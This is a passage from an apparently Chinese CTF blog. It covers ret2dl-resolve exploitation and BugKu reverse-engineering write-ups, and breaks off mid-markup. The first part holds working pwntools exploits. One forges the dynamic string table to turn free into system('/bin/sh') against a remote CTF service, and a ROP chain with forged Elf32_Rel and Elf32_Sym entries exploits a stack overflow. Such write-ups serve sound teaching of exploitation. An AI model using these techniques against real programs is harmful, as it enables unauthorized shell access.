gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">"rnote4.2018.teamrois.cn"</span>, <span class="number">6767</span>)</span><br><span class="line"> </span><br><span class="line">def add(content):</span><br><span class="line">    assert len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x01"</span>)</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line">def edit(idx, content):</span><br><span class="line">    assert idx &lt; <span class="number">32</span> <span class="keyword">and</span> len(content) &lt; <span class="number">256</span></span><br><span class="line">    sh.send(<span class="string">"\x02"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line">    sh.send(chr(len(content)))</span><br><span class="line">    sh.send(content)</span><br><span class="line"> </span><br><span class="line">def <span class="keyword">delete</span>(idx):</span><br><span class="line">    assert idx &lt; <span class="number">32</span></span><br><span class="line">    sh.send(<span class="string">"\x03"</span>)</span><br><span class="line">    sh.send(chr(idx))</span><br><span class="line"> </span><br><span class="line">#伪造的字符串表，(<span class="number">0x457</span><span class="number">-0x3f8</span>)刚好是<span class="string">"free\x00"</span>字符串的偏移</span><br><span class="line">payload = <span class="string">"C"</span> * (<span class="number">0x457</span><span class="number">-0x3f8</span>) + <span class="string">"system\x00"</span></span><br><span class="line">#先新建两个notes</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span> + <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line">#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x601EB0</span>))</span><br><span class="line">#将<span class="number">0x601EB0</span>，即.dynamic的字符串表指针，写成<span class="number">0x6020C8</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x6020C8</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"A"</span> * <span class="number">0x10</span> + p64(<span class="number">33</span>) + p64(<span class="number">0x18</span>) + p64(<span class="number">0x6020C8</span>))</span><br><span class="line">#在<span class="number">0x6020C8</span>处写入伪造的字符串表</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"> </span><br><span class="line">#会第一次调用<span class="built_in">free</span>，所以实际上是system(<span class="string">"/bin/sh"</span>)被调用，如前面所说</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="操纵第二个参数，使其指向我们所构造的Elf32-Rel"><a href="#操纵第二个参数，使其指向我们所构造的Elf32-Rel" class="headerlink" title="操纵第二个参数，使其指向我们所构造的Elf32_Rel"></a>操纵第二个参数，使其指向我们所构造的Elf32_Rel</h2><p>如果<code>.dynamic</code>不可写，那么以上方法就没用了，所以有第二种利用方法。要知道，前面的<code>_dl_runtime_resolve</code>在第二步时</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; .rel.plt + 第二个参数`求出当前函数的重定位表项`Elf32_Rel`的指针，记作`rel</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>这个时候，<code>_dl_runtime_resolve</code>并没有检查<code>.rel.plt + 第二个参数</code>后是否造成越界访问，所以我们能给一个很大的<code>.rel.plt</code>的offset（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<code>.bss</code>。</p><p>然后第三步</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; rel-&gt;r_info &gt;&gt; 8`作为`.dynsym`的下标，求出当前函数的符号表项`Elf32_Sym`的指针，记作`sym</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>所以在我们所伪造的<code>Elf32_Rel</code>，需要放一个<code>r_info</code>字段，大概长这样就行<code>0xXXXXXX07</code>，其中XXXXXX是相对<code>.dynsym</code>表的下标，注意不是偏移，所以是偏移除以<code>Elf32_Sym</code>的大小，即除以<code>0x10</code>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<code>Elf32_Sym</code>。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。</p><p>然后第四步</p><blockquote><p><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</p></blockquote><p>同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。</p><p>所以，最终的利用思路，大概是</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_GP7F2G76BJHTFAX.png.jpg" alt="img"></p><p>构造ROP，跳转到resolve的PLT，<code>push link_map</code>的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的<code>Elf32_Rel</code>的偏移，然后是返回地址（<code>system</code>的话无所谓），再然后是参数（如果是<code>system</code>函数的话就要是指向<code>&quot;/bin/sh\x00&quot;</code>的指针）</p><p>最后来道经典例题，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v4; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v5; // [esp+64h] [ebp-8h]</span><br><span class="line"> </span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v4, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v1 = strlen(buf);</span><br><span class="line">  write(1, buf, v1);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[108]; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"> </span><br><span class="line">  setbuf(stdin, buf);</span><br><span class="line">  return read(0, buf, 256u); //栈溢出</span><br><span class="line">&#125;</span><br><span class="line">//gcc -m32 -fno-stack-protector -no-pie -s pwn200.c</span><br></pre></td></tr></table></figure><p>明显的栈溢出，但是没给libc，ROPgadget也少，所以要用ret2dl-resolve。</p><p>利用思路如下:</p><ol><li><p>第一次调用<code>read</code>函数，返回地址再溢出成<code>read</code>函数，这次参数给一个<code>.bss</code>的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个<code>read</code>之后，ROP到<code>leave; retn</code>的地址，以便切栈切到在<code>.bss</code>中我们构造的下一个ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">108</span></span><br><span class="line">payload1 += p32(NEXT_ROP) <span class="comment"># ebp会在这里被pop出来，到时候leave就可以切栈</span></span><br><span class="line">payload1 += p32(READ_ADDR)</span><br><span class="line">payload1 += p32(LEAVE_RETN)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(BUFFER - ROP_SIZE)</span><br><span class="line">payload1 += p32(<span class="number">0x100</span>)</span><br><span class="line">payload1 += <span class="string">"P"</span> * (<span class="number">0x100</span> - len(payload1))</span><br><span class="line">sh.send(payload1)</span><br></pre></td></tr></table></figure></li><li><p>第二次调用<code>read</code>函数，此时要<code>send</code>ROP链以及所有相关的伪造数据结构</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_Elf32_Rel = p32(STRLEN_GOT)</span><br><span class="line">fake_Elf32_Rel += p32(FAKE_SYMTAB_IDX)</span><br><span class="line"> </span><br><span class="line">fake_Elf32_Sym = p32(FAKE_STR_OFF)</span><br><span class="line">fake_Elf32_Sym += p32(<span class="number">0</span>)</span><br><span class="line">fake_Elf32_Sym += p32(<span class="number">0</span>)</span><br><span class="line">fake_Elf32_Sym += chr(<span class="number">0x12</span>) + chr(<span class="number">0</span>) + p16(<span class="number">0</span>) <span class="comment"># 其它字段直接照抄IDA里面的数据就好</span></span><br><span class="line"> </span><br><span class="line">strings = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line"> </span><br><span class="line">rop = p32(<span class="number">0</span>) <span class="comment"># pop ebp, 随便设反正不用了</span></span><br><span class="line">rop += p32(DYN_RESOL_PLT) <span class="comment"># resolve的PLT，就是前面说的push link_map那个位置</span></span><br><span class="line">rop += p32(FAKE_REL_OFF) <span class="comment"># 伪造的重定位表OFFSET</span></span><br><span class="line">rop += <span class="string">"AAAA"</span> <span class="comment"># 返回地址，不用了随便设</span></span><br><span class="line">rop += p32(BIN_SH_ADDR) <span class="comment"># 参数，"/bin/sh"</span></span><br><span class="line"> </span><br><span class="line">payload2 = rop + fake_Elf32_Rel + fake_Elf32_Sym + strings</span><br><span class="line"> </span><br><span class="line">sh.send(payload2)</span><br></pre></td></tr></table></figure><p>至于offset这些东西要自己慢慢撸，反正我搞了挺久的。。。就在IDA里把地址copy出来然后慢慢算偏移就好了。。。</p><p>完整exp写的有点丑，放附件了。</p><p>PS: 其他一些大佬博客的exp我没有很看懂。。。不知道为啥要写那么长。。。我是弄懂了方法就按照自己的思路写的，不过也对就是了。。。</p><p>然后貌似有个自动得出ROP的工具叫作<a href="https://github.com/inaz2/roputils" target="_blank" rel="noopener">roputils</a>，这样就不用自己搞这么一串ROP了。。。不过用工具前还是要先搞懂原理的不然就成脚本小子了嘛。。。</p><h2 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map?"></a>伪造link_map?</h2><p>貌似也可行，而且64位下<code>link_map+0x1c8</code> 好像要置0，所以可能要自己伪造<code>link_map</code>。但是<code>link_map</code>结构有点复杂，网上也没有关于这种利用方式的资料，以后有空会再研究一下。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BugKu_Re(1)</title>
      <link href="/2019/10/07/BugKu-Re-1/"/>
      <url>/2019/10/07/BugKu-Re-1/</url>
      
        <content type="html"><![CDATA[<h2 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h2><p>没啥好说的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mov     byte ptr [esp+<span class="number">2F</span>h], <span class="string">'f'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2</span>Eh], <span class="string">'l'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2</span>Dh], <span class="string">'a'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2</span>Ch], <span class="string">'g'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2B</span>h], <span class="string">'&#123;'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2</span>Ah], <span class="string">'R'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">29</span>h], <span class="string">'e'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">28</span>h], <span class="string">'_'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">27</span>h], <span class="string">'1'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">26</span>h], <span class="string">'s'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">25</span>h], <span class="string">'_'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">24</span>h], <span class="string">'S'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">23</span>h], <span class="string">'0'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">22</span>h], <span class="string">'_'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">21</span>h], <span class="string">'C'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">20</span>h], <span class="string">'0'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">1F</span>h], <span class="string">'O'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">1</span>Eh], <span class="string">'L'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">1</span>Dh], <span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure><p><strong>flag{Re_1s_S0_C0OL}</strong></p><h2 id="Easy-vb"><a href="#Easy-vb" class="headerlink" title="Easy_vb"></a>Easy_vb</h2><p>没啥好说的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00401</span>A48 dword_401A48    dd <span class="number">33</span>AD4EE1h, <span class="number">11</span>CF6699h, <span class="number">0</span>AA000CB7h, <span class="number">93</span>D36000h, <span class="number">2</span>Eh</span><br><span class="line">.text:<span class="number">00401</span>A48                                         ; DATA XREF: .text:<span class="number">00402398</span>↓o</span><br><span class="line">.text:<span class="number">00401</span>A48                                         ; .text:<span class="number">0040241</span>E↓o ...</span><br><span class="line">.text:<span class="number">00401</span>A5C aMctfN3tRev1sE4:                        ; DATA XREF: .text:<span class="number">004023</span>A9↓o</span><br><span class="line">.text:00401A5C                 text "UTF-16LE", 'MCTF&#123;_N3t_Rev_1s_E4ay_&#125;',0</span><br><span class="line">.text:<span class="number">00401</span>A8C                 dd <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">00401</span>A90 aTryAgain:                              ; DATA XREF: .text:<span class="number">00402473</span>↓o</span><br></pre></td></tr></table></figure><p><strong>flag{<em>N3t_Rev_1s_E4ay</em>}</strong></p><h2 id="Easy-re"><a href="#Easy-re" class="headerlink" title="Easy_re"></a>Easy_re</h2><p>没啥好说的，OD载入easy_vb.exe，右键中文字符串智能搜索,发现疑似flag字符串</p><p><img src="https://i.loli.net/2019/03/20/5c92561c36680.png" alt="od.png"></p><p><strong>DUTCTF{We1c0met0DUTCTF}</strong></p><h2 id="游戏过关"><a href="#游戏过关" class="headerlink" title="游戏过关"></a>游戏过关</h2><h4 id="修改Path法"><a href="#修改Path法" class="headerlink" title="修改Path法"></a>修改Path法</h4><p>搜索关键字符串<strong>“flag”</strong>直接找到<strong>main</strong>函数，我们找到了一个<strong>jnz</strong>和<strong>call</strong>的地方，因为不是<strong>flag</strong>的直接比较，所以想法是跳转至成功函数输出<strong>flag</strong>，总之就是寻找各种跳转函数，最后跳到<strong>0x0045F66C</strong>这个调用<strong>sub_45E940</strong>函数的地址即可</p><h4 id="直接逻辑法"><a href="#直接逻辑法" class="headerlink" title="直接逻辑法"></a>直接逻辑法</h4><p>搜索关键字符串<strong>“flag</strong>”直接找到<strong>main</strong>函数，然后修改常见函数名得到主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B110);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B158);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B1A0);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B1E8);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B230);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B278);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B2C0);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B308);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"二                                                     |\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"|              by 0x61                                 |\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"|                                                      |\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"|------------------------------------------------------|\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Play a game\n"</span></span><br><span class="line">    <span class="string">"The n is the serial number of the lamp,and m is the state of the lamp\n"</span></span><br><span class="line">    <span class="string">"If m of the Nth lamp is 1,it's on ,if not it's off\n"</span></span><br><span class="line">    <span class="string">"At first all the lights were closed\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now you can input n to change its state\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"But you should pay attention to one thing,if you change the state of the Nth lamp,the state of (N-1)th and (N+1)th w"</span></span><br><span class="line">    <span class="string">"ill be changed too\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"When all lamps are on,flag will appear\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now,input n \n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"input n,n(1-8)\n"</span>);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"n="</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"sorry,n error,try again\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4576D6(v1 - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i &gt;= <span class="number">9</span> )</span><br><span class="line">          j____report_rangecheckfailure();</span><br><span class="line">        byte_532E28[i] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j__system(<span class="string">"CLS"</span>);</span><br><span class="line">    sub_458054();</span><br><span class="line">    <span class="keyword">if</span> ( byte_532E28[<span class="number">0</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">1</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">2</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">3</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">4</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">5</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">6</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">7</span>] == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_457AB4();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时也找到了调用函数<strong>sub_45E940</strong>，存在两个数组，先两个数组按位异或，再与0x13异或，直接提取出数据然后写脚本跑即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">56</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   *(&amp;v2 + i) ^= *(&amp;v59 + i);</span><br><span class="line">   *(&amp;v2 + i) ^= <span class="number">0x13</span>u;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ss4 = [<span class="number">0x12</span>,<span class="number">0x40</span>,<span class="number">0x62</span>,<span class="number">0x5</span>,<span class="number">0x2</span>,<span class="number">0x4</span>,<span class="number">0x6</span>,<span class="number">0x3</span>,<span class="number">0x6</span>,<span class="number">0x30</span>,<span class="number">0x31</span>,<span class="number">0x41</span>,<span class="number">0x20</span>,<span class="number">0x0C</span>,<span class="number">0x30</span>,<span class="number">0x41</span>,<span class="number">0x1F</span>,<span class="number">0x4E</span>,<span class="number">0x3E</span>,<span class="number">0x20</span>,<span class="number">0x31</span>,<span class="number">0x20</span>,<span class="number">0x1</span>,<span class="number">0x39</span>,<span class="number">0x60</span>,<span class="number">0x3</span>,<span class="number">0x15</span>,<span class="number">0x9</span>,<span class="number">0x4</span>,<span class="number">0x3E</span>,<span class="number">0x3</span>,<span class="number">0x5</span>,<span class="number">0x4</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x3</span>,<span class="number">0x2C</span>,<span class="number">0x41</span>,<span class="number">0x4E</span>,<span class="number">0x20</span>,<span class="number">0x10</span>,<span class="number">0x61</span>,<span class="number">0x36</span>,<span class="number">0x10</span>,<span class="number">0x2C</span>,<span class="number">0x34</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x59</span>,<span class="number">0x2D</span>,<span class="number">0x20</span>,<span class="number">0x41</span>,<span class="number">0x0F</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x10</span>,<span class="number">0x0</span>]</span><br><span class="line">ss8 = [<span class="number">0x7B</span>,<span class="number">0x20</span>,<span class="number">0x12</span>,<span class="number">0x62</span>,<span class="number">0x77</span>,<span class="number">0x6C</span>,<span class="number">0x41</span>,<span class="number">0x29</span>,<span class="number">0x7C</span>,<span class="number">0x50</span>,<span class="number">0x7D</span>,<span class="number">0x26</span>,<span class="number">0x7C</span>,<span class="number">0x6F</span>,<span class="number">0x4A</span>,<span class="number">0x31</span>,<span class="number">0x53</span>,<span class="number">0x6C</span>,<span class="number">0x5E</span>,<span class="number">0x6C</span>,<span class="number">0x54</span>,<span class="number">0x6</span>,<span class="number">0x60</span>,<span class="number">0x53</span>,<span class="number">0x2C</span>,<span class="number">0x79</span>,<span class="number">0x68</span>,<span class="number">0x6E</span>,<span class="number">0x20</span>,<span class="number">0x5F</span>,<span class="number">0x75</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0x7B</span>,<span class="number">0x7F</span>,<span class="number">0x77</span>,<span class="number">0x60</span>,<span class="number">0x30</span>,<span class="number">0x6B</span>,<span class="number">0x47</span>,<span class="number">0x5C</span>,<span class="number">0x1D</span>,<span class="number">0x51</span>,<span class="number">0x6B</span>,<span class="number">0x5A</span>,<span class="number">0x55</span>,<span class="number">0x40</span>,<span class="number">0x0C</span>,<span class="number">0x2B</span>,<span class="number">0x4C</span>,<span class="number">0x56</span>,<span class="number">0x0D</span>,<span class="number">0x72</span>,<span class="number">0x1</span>,<span class="number">0x75</span>,<span class="number">0x7E</span>,<span class="number">0x0</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x38</span>):</span><br><span class="line">    flag += chr(ss4[i]^ss8[i]^<span class="number">0x13</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>得到flag：<strong>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</strong></p><h2 id="Timer-阿里CTF-题目分析"><a href="#Timer-阿里CTF-题目分析" class="headerlink" title="Timer(阿里CTF)题目分析"></a>Timer(阿里CTF)题目分析</h2><ul><li><p>在安卓模拟器上运行程序<br> <img src="https://i.loli.net/2019/04/10/5cadadbc74e63.png" alt="流程.png"></p></li><li><p>程序流程 </p><blockquote><p>提示信息  </p><blockquote><p>Time remaining(s):200000<br> AliCTF{}  </p></blockquote><p>初步分析  </p><blockquote><p>应该是200000秒之后才会出现flag<br> 下一步使用安卓调试神器<a href="https://www.52pojie.cn/thread-547547-1-1.html" target="_blank" rel="noopener">JEB</a>进一步分析      </p></blockquote></blockquote></li></ul><h3 id="JEB分析"><a href="#JEB分析" class="headerlink" title="JEB分析"></a>JEB分析</h3><ul><li><p>JEB介绍 </p><blockquote><p>JEB:<a href="https://www.52pojie.cn/thread-675251-1-1.html" target="_blank" rel="noopener">IDA</a>+111=JEB,JEB相当于Windows平台上的IDA  </p><p>smali代码:双击Bytecode,出现smali代码;相较于C之汇编,则smali之于Java  </p><blockquote><p><img src="https://i.loli.net/2019/04/10/5cadb2004a6b6.png" alt="smali.png"> </p><p><a href="https://blog.csdn.net/cloverjf/article/details/78613830" target="_blank" rel="noopener">smali语法参考文章</a>  </p></blockquote><p>快捷键：按<code>q</code>切换到java伪代码</p></blockquote></li><li><p>进入android程序入口类</p><ul><li><p>进入方式</p><p><code>Bytecode/Hierarchy-net-tomorrow-MainActivity</code></p><p><img src="https://i.loli.net/2019/04/10/5cadb2004c374.png" alt="入口类.png"></p><p><img src="https://i.loli.net/2019/04/10/5cadb33e04764.png" alt="smali2.png"><br> &gt; 双击左边的Bytecode默认进入的就是此入口类  </p></li><li><p>按 <code>Q</code> 查看java伪代码</p><p><img src="https://i.loli.net/2019/04/10/5cadb3f5df43e.png" alt="伪代码.png"></p></li><li><p>查看onCreate函数<br> &gt; 一个activity启动回调的第一个函数就是onCreate,这个函数主要做这个activity启动的一些必要的初始化的工作。<br> &gt;<br> &gt; onCreate之后调用了还有onRestart()和onStart()等。</p><p><img src="https://i.loli.net/2019/04/10/5cadc40677139.png" alt="注释onCreate.png"></p></li><li><p>查看onCreate回调的MainActivity函数  </p><figure class="highlight 